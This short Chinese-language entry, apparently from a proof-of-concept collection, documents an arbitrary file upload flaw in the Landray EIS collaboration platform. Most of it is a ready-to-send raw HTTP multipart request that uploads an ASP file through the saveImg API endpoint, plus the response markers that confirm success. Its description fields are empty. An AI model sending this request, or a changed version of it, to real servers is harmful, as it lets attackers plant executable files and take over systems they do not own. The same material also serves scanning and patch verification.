﻿# 蓝凌EIS智慧协同平台任意文件上传

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Connection: close
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----test

------test
Content-Disposition: form-data; name="file"filename="test.asp"
Content-Type: text/html

<% response.write("test")%>
------test--
```

> 响应代码特征：200

> 响应内容特征：files

> 上传文件定位：

> 验证文件来源：蓝凌EIS智慧协同平台任意文件上传.poc
